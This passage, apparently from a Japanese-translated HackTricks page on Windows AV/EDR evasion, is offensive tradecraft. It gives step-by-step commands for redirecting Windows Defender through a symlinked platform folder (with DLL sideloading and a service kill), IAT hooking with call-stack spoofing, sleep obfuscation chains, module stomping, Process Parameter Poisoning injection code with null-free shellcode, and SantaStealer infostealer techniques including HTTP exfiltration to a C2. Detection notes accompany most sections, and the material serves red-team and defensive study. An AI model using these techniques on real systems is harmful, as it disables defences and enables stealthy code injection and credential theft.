最も高い lexicographic version string（例: `4.18.25070.5-0`）を持つ subfolder を選択し、そこから Defender service process を start します（service/registry path もそれに応じて更新されます）。この選択では、directory reparse point（symlink を含む）の directory entry が信頼されます。administrator はこれを利用して Defender を attacker-writable path に redirect し、DLL sideloading または service disruption を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- Local Administrator（Platform folder 配下に directory/symlink を作成するために必要）
- reboot または Defender platform の再選択を trigger できること（boot 時の service restart）
- 必要なのは built-in tool のみ（mklink）

動作する理由
- Defender は自身の folder への write を block しますが、platform selection では directory entry を信頼し、target が protected/trusted path に resolve されるかを検証せずに、lexicographically highest version を選択します。

Step-by-step（例）
1) 現在の platform folder の writable clone を準備します。例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダを指す higher-version directory symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスのパスが `C:\TMP\AV\` 配下にあり、サービス設定/registry にその場所が反映されていることを確認します。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置/置換し、Defender のプロセス内で code を実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: version-symlink を削除すると、次回の起動時に設定されたパスが解決されず、Defender の起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> この technique 単体では privilege escalation は提供されないことに注意してください。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、対象 module 自体の Import Address Table (IAT) を hooking し、選択した API を attacker-controlled な position-independent code (PIC) 経由で routing することで、runtime evasion を C2 implant から対象 module 内へ移動できます。これにより、多くの kit が公開する小規模な API surface（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOFs や post-exploitation DLLs にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-level approach
- reflective loader（prepend または companion）を使用して、対象 module とともに PIC blob を stage します。PIC は self-contained かつ position-independent でなければなりません。
- host DLL の load 時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、対象 import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT entry を thin PIC wrapper を指すよう patch します。
- 各 PIC wrapper は、real API address に tail-call する前に evasion を実行します。典型的な evasion には以下が含まれます。
- call の前後で memory を mask/unmask する（例: beacon region の encrypt、RWX→RX、page name/permission の変更）。その後、call 完了後に復元します。
- Call-stack spoofing: benign な stack を構築し、target API へ transition して、call-stack analysis が想定された frame を解決するようにします。<sup>[[9]](#references)</sup>
- compatibility のため、Aggressor script（または equivalent）が Beacon、BOFs、post-ex DLLs で hook する API を登録できる interface を export します。

Why IAT hooking here
- hooked import を使用するあらゆる code で機能し、tool code の変更や、特定の API を proxy するために Beacon に依存する必要がありません。
- post-ex DLLs をカバーします。LoadLibrary* を hooking することで module load（例: System.Management.Automation.dll、clr.dll）を intercept し、それらの API call に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapping することで、call-stack–based detection に対して process-spawning post-ex command を確実に使用できるようにします。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR の後、import を初めて使用する前に patch を適用する。TitanLdr/AceLdr のような Reflective loader は、ロードされた module の DllMain 中に hooking を行う例を示している。
- wrapper は小さく、PIC-safe に保つ。true API は、patch 前に取得しておいた元の IAT 値、または LdrGetProcedureAddress 経由で解決する。
- PIC では RW → RX の transition を使用し、writable+executable ページを残さない。

Call‑stack spoofing stub
- Draugr-style PIC stub は、benign module 内の return address で fake call chain を構築し、その後 real API に pivot する。
- これにより、Beacon/BOFs から sensitive API への canonical stack を想定する detection を回避する。
- stack cutting/stack stitching technique と組み合わせ、API prologue の前に想定される frame 内へ着地させる。

Operational integration
- reflective loader を post-ex DLL の先頭に追加し、DLL がロードされた際に PIC と hooks が自動的に初期化されるようにする。
- Aggressor script を使用して target API を登録し、code changes なしで Beacon と BOFs が同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）address に解決される entry、import pointer の定期的な検証。
- Stack anomalies: loaded image に属さない return address、non-image PIC への突然の transition、整合しない RtlUserThreadStart ancestry。
- Loader telemetry: process 内からの IAT への write、import thunk を変更する早期の DllMain activity、load 時に作成される予期しない RX region。
- Image-load evasion: LoadLibrary* を hooking している場合、memory masking event と相関する automation/clr assembly の suspicious な load を監視する。

Related building blocks and examples
- load 中に IAT patching を行う reflective loader（例: TitanLdr、AceLdr）
- memory masking hooks（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO 経由の Import-time IAT hooks

reflective loader を制御できる場合、custom resolver で loader の `GetProcAddress` pointer を置き換え、最初に hooks を確認することで、`ProcessImports()` **中に** imports を hooking できる:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC が自身を解放した後も存続する **resident PICO**（persistent PIC object）を構築する。
- `setup_hooks()` function を export し、loader の import resolver を上書きする（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal imports をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使用する。hook が存在する場合はそれを返し、それ以外の場合は real `GetProcAddress` に delegate する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry を使用して link time に hook target を登録する。hook は resident PICO 内に存在するため有効なままになる。

これにより、load 後に loaded DLL の code section を patch せずに **import-time IAT redirection** を実現できる。

### target が PEB-walking を使用する場合に hookable imports を強制する

import-time hooks は、その function が target の IAT に実際に存在する場合にのみ trigger される。module が PEB-walk + hash によって API を解決している場合（import entry がない場合）は、real import を強制して loader の `ProcessImports()` path に認識させる:

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を生成するため、reflective loader が imports を解決する際に interception が可能になる。

### `Sleep()` を patch しない Ekko-style sleep/idle obfuscation

`Sleep` を patch する代わりに、implant が実際に使用する **wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook する。長時間の wait では、Ekko-style obfuscation chain 内で call を wrap し、idle 中に in-memory image を encrypt する:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使用して、crafted `CONTEXT` frame で `NtContinue` を呼び出す callback sequence を schedule する。
- Typical chain（x64）: image を `PAGE_READWRITE` に設定 → mapped image 全体を対象に `advapi32!SystemFunction032` で RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE section を走査して **per-section permission を restore** → completion を signal する。
- `RtlCaptureContext` は template `CONTEXT` を提供する。それを複数の frame に clone し、register（`Rip/Rcx/Rdx/R8/R9`）を設定して各 step を invoke する。

Operational detail: 長時間の wait（例: `WAIT_OBJECT_0`）では “success” を返し、image が masked されている間も caller が継続するようにする。この pattern は idle window 中に scanner から module を隠し、従来の “patched `Sleep()`” signature を回避する。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の burst。
- 大きく連続した image-size buffer に対する `advapi32!SystemFunction032` の使用。
- 大規模な `VirtualProtect` の後に行われる custom per-section permission restoration。

### sleep-obfuscation gadget の Runtime CFG registration

CFG-enabled target では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget への最初の indirect jump は、通常 `STATUS_STACK_BUFFER_OVERRUN` により process を crash させる。これは gadget が module の CFG metadata に存在しないためである。hardened process 内で Ekko/Kraken-style chain を維持するには:<sup>[[30]](#references)</sup>

- chain が使用するすべての indirect destination を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で登録する。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は **image base** から開始し、**image size 全体**を対象にする必要がある。
- manually mapped/PIC/stomped region では、代わりに **allocation base** と allocation size を使用する。
- dispatch gadget だけでなく、間接的に到達する exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、indirect target となる attacker-controlled executable section も mark する。

これにより、ROP/JOP-style sleep chain は “non-CFG process でのみ動作する” primitive から、`/guard:cf` で compile された `explorer.exe`、browser、`svchost.exe`、その他の endpoint で再利用可能な primitive になる。

### sleeping thread 向け CET-safe stack spoofing

完全な `CONTEXT` replacement は noisy であり、spoof された `Rip` が hardware shadow stack と一致する必要があるため、CET Shadow Stack system では問題になる可能性がある。より安全な sleep-masking pattern は次のとおり:<sup>[[30]](#references)</sup>

- 同一 process 内の別 thread を選び、`NtQueryInformationThread` 経由でその `NT_TIB` / TEB の stack bounds（`StackBase`、`StackLimit`）を読み取る。
- 現在の thread の real TEB/TIB を backup する。
- `GetThreadContext` で real sleeping context を capture する。
- real `Rip` **のみ**を spoof context に copy し、spoof された `Rsp`/stack state はそのままにする。
- sleep window 中、spoof thread の `NT_TIB` を current TEB に copy し、stack walker が legitimate stack range 内で unwind するようにする。
- wait 完了後、original TIB と thread context を restore する。

これにより CET と整合する instruction pointer を維持しつつ、TEB stack metadata を信頼して unwind を検証する EDR stack walker を欺く。

### APC-based alternative: Kraken Mask

timer-queue dispatch が signatured すぎる場合、同じ sleep-encrypt-spoof-restore sequence を queued APC を使用する suspended helper thread から実行できる:<sup>[[27]](#references)</sup>

- entrypoint に `NtTestAlert` を指定して helper thread を作成する。
- `NtQueueApcThread` で prepared `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で drain する。
- default 64 KB thread stack を使い果たさないよう、chain state を helper stack ではなく heap に保存する。
- `NtSignalAndWaitForSingleObject` を使用して start event を atomic に signal し、block する。
- TIB/context を restore する前に main thread を suspend する（`NtSuspendThread` → restore → `NtResumeThread`）。これにより、scanner が half-restored stack を捕捉できる race window を小さくする。

これは `CreateTimerQueueTimer` + `NtContinue` signature を helper-thread/APC signature に置き換えつつ、同じ RC4 masking と stack-spoofing の目的を維持する。

Additional detection ideas
- sleep、wait、または APC dispatch の直前に行われる、`VmCfgCallTargetInformation` を指定した `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の周囲で wrap された `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後に行われる、current thread の TEB/TIB stack bounds への direct write。
- `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に間接的に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- signed module 内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような短い gadget signature を繰り返し使用すること。


## Precision Module Stomping

Module stomping は、明らかな private executable memory を allocate したり、新しい sacrificial DLL を load したりする代わりに、target process 内にすでに mapped された DLL の **`.text` section** から payload を実行する。overwrite target には、process がまだ必要とする code path を破壊せずに payload を収容できる、**loaded された disk-backed image** を選ぶべきである。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような common module に対する naive な stomping は fragile である。DLL が remote process に load されていない可能性があり、code region が小さすぎると process が crash する。より reliable な workflow は次のとおり:

1. target process の module を enumerate し、すでに load されている DLL の **names-only include list** を保持する。
2. 先に payload を build し、その **exact byte size** を記録する。
3. disk 上の candidate DLL を scan し、PE section **`.text` の `Misc_VirtualSize`** と payload size を比較する。これは file size より重要であり、memory に mapped された際の executable section の size を反映する。
4. **Export Address Table (EAT)** を parse し、export された function の RVA を stomp start offset として選択する。
5. **blast radius** を計算する。payload が選択した function boundary を超える場合、memory 上でその後に配置された隣接 export を overwrite する。

Typical recon/selection helper seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- `LoadLibrary`/unexpected image loads の telemetry を回避するため、remote process に **すでに loaded** されている DLL を優先する。
- target application によって実行される頻度が低い exports を優先する。そうしないと、thread creation の前後に通常の code path が stomped bytes に到達する可能性がある。
- 大規模な implants では、injector source 内で full buffer が正しく表現されるよう、shellcode embedding を string literal から **byte-array/braced initializer** に変更する必要があることが多い。

検出のポイント
- より一般的な private RWX/RX allocations ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）への remote writes。
- メモリ上の export entry points の bytes が、disk 上の backing file と一致しなくなっているもの。
- 最近 first bytes が変更された正規 DLL export 内から実行を開始する remote threads または context pivots。
- DLL `.text` pages に対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` の sequence と、それに続く thread creation。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、classic remote write path（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique である。すでに実行中の target に bytes をコピーする代わりに、Windows が `CreateProcessW` の startup parameters の一部を child process に **コピー**し、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に保存するという性質を悪用する。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によってコピーされる Poisonable carriers

有用な carriers は以下のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` 使用時）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` のために **writable memory** を指している必要があり、null terminator を含めて **32,767 Unicode characters** に制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` strings からなり、追加の `\0` で終端される Unicode environment block でなければならない。
- `lpReserved` は公式には reserved であるため、`ShellInfo` mapping は安定した documented contract ではなく、implementation detail として扱うべきである。

これにより、通常の process creation が **payload-transfer primitive** になる。operator は attacker-controlled startup data を使って child process を作成し、Windows に cross-process copy を実行させる。

### Remote write APIs を使用しない Remote lookup flow

child が作成された後、**read-only** primitives を使用してコピーされた buffer を解決する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. remote `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択した pointer を使用する：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

最小限の flow：
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返されているメインスレッドハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

classic thread hijacking workflows とは異なり、これは **`SuspendThread` / `ResumeThread` を必要としません**。返されたメインスレッドハンドルに対して、直接コンテキストを変更できます。

これにより、injection で一般的に監視される複数の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も対象

### Null-byte の制限と staged shellcode

3 つの carrier はすべて **string または string-like data** であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、runtime で constants を再構築し、その後任意の second stage をロードする **null-free first stage** です。

単純なパターンは、XOR-based constant synthesis です。
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
これにより、first stageは、転送されるパラメータにnull bytesを埋め込まずに、stack strings、API arguments、DLL paths、またはsecond-stage shellcode loaderを構築できます。

### first stageからのstack-based API calls

first stageが`LoadLibraryA`などのAPIを呼び出す必要がある場合、次の処理を実行できます。

- target stackにstring/bufferをpushする
- **32-byte x64 shadow space**を確保する
- `RCX`、`RDX`、`R8`、`R9`をconstantsまたは`RSP`相対ポインタに設定する
- callの前に`RSP`を**16-byte aligned**に保つ

その後、second stageをstackから`PAGE_READWRITE` allocationにコピーし、`VirtualProtect`で`PAGE_EXECUTE_READ`に変更してからjumpできます。これにより、直接的なRWX allocationを回避できます。

### Detection ideas

authorsが言及している有効なhuntingの機会：

- `VirtualProtectEx` / `NtProtectVirtualMemory`によって**process-parameter pagesをexecutableにする**動作
- そのprotection changeに続く`SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて`RTL_USER_PROCESS_PARAMETERS`へのremote reads
- process creation中の異常に長い、または高entropyな`lpCommandLine`、`lpEnvironment`、`STARTUPINFO.lpReserved`の値

### Notes

- P3は**cross-process transfer trick**であり、それ自体は完全なexecution primitiveではありません。コピーされたparameterには、execute-permission changeとexecution redirection methodが依然として必要です。
- `RtlCreateProcessReflection` / Dirty Vanityはauthorsによって検討されましたが、内部で`NtWriteVirtualMemory`や`NtCreateThreadEx`などの疑わしいprimitivesに到達するため、却下されました。

## Fileless EvasionとCredential TheftのためのSantaStealer Tradecraft

SantaStealer（別名BluelineStealer）は、現代のinfo-stealersがAV bypass、anti-analysis、credential accessを単一のworkflowにどのように組み合わせるかを示しています。<sup>[[24]](#references)</sup>

### Keyboard layout gatingとsandbox delay

- config flag（`anti_cis`）は、`GetKeyboardLayoutList`を介してインストール済みのkeyboard layoutsを列挙します。Cyrillic layoutが見つかると、sampleは空の`CIS` markerを作成してstealersを実行する前にterminateします。これにより、除外対象のlocales上でdetonateすることを防ぎつつ、hunting artifactを残します。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層 `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、debugger/sandbox の埋め込み blocklist と比較する。また、コンピューター名に対しても同じチェックサムを計算し、`C:\analysis` などの作業ディレクトリをチェックする。
- Variant B はシステムプロパティ（プロセス数の下限、最近の uptime）を検査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出する。また、sleep 前後のタイミングをチェックして single-stepping を検知する。いずれかに該当すると、modules が起動する前に中止する。

### Fileless helper + 二重 ChaCha20 reflective loading

- 主 DLL/EXE には Chromium credential helper が埋め込まれており、ディスクに drop するか、メモリ上に手動で map する。fileless mode では import/relocation を自ら解決するため、helper の成果物は書き込まれない。
- その helper は、second-stage DLL を ChaCha20 で二重に暗号化して保存する（32-byte key 2個 + 12-byte nonce 2個）。両方の pass を終えると、blob を reflectively load し（`LoadLibrary` は使用しない）、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator routines は direct-syscall reflective process hollowing を使用して稼働中の Chromium browser に inject し、AppBound Encryption keys を継承する。そして、ABE hardening にもかかわらず、SQLite databases から passwords/cookies/credit cards を直接 decrypt する。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` は global な `memory_generators` function-pointer table を反復処理し、有効化された各 module（Telegram、Discord、Steam、screenshots、documents、browser extensions など）につき1つの thread を spawn する。各 thread は共有 buffer に結果を書き込み、約45秒の join window 後に file count を報告する。
- 完了すると、すべてのデータを statically linked な `miniz` library で `%TEMP%\\Log.zip` として zip 化する。続いて `ThreadPayload1` は15秒 sleep し、archive を10 MB単位の chunks で HTTP POST により `http://<C2>:6767/upload` へ stream する。この際、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を spoof する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付加されるため、C2 は再構成の完了を認識できる。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust を信頼すべきか？Zscaler の posture checks を bypass する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware operations を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：Forwarded Exports の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) の保護を利用して EDR に対抗する](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の Protective Shell を破る](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain の内側：RAT から Builder、Coder まで](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer が街にやって来る：新たな野心的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API Tracing で Node.js Malware を打ち破る](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations での Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を Kernel Operation Primitive として weaponize する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
